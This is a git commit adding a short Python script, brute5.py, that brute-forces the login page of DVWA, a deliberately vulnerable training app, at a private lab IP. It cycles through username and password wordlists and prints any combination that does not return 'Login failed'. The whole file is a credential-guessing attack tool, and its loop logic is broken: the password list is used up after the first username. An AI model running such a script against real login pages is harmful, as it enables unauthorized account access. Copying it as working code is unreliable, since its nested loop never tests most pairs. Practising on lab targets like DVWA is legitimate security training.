9c2d08d90bb771849f1ea33324a735338f18cd3d
federicocattani1 <132648398+federicocattani1@users.noreply.github.com>
2023-05-23 21:29:23 +0200

    Add files via upload

---
+++ brute5.py
@@ -0,0 +1,26 @@
+import requests
+
+target_url = 'http://192.168.50.101/dvwa/login.php'
+usernames_file = '/Users/federicocattani/Desktop/brute/usernames.txt'
+passwords_file = '/Users/federicocattani/Desktop/brute/passwords.txt'
+
+with open(usernames_file, 'r') as usernames:
+    with open(passwords_file, 'r') as passwords:
+        for username in usernames:
+            username = username.strip()
+            
+            for password in passwords:
+                password = password.strip()
+                
+                response = requests.post(target_url, data={'username': username, 'password': password})
+                
+                print('Provo con: {}/{}'.format(username, password))
+                print('Stato della risposta: {}'.format(response.status_code))
+                
+                if response.status_code == 200:
+                    if 'Login failed' not in response.text:
+                        print('Combinazione utente/password trovata: {}/{}'.format(username, password))
+                        break
+                    else:
+                        print('Combinazione errata.')
+
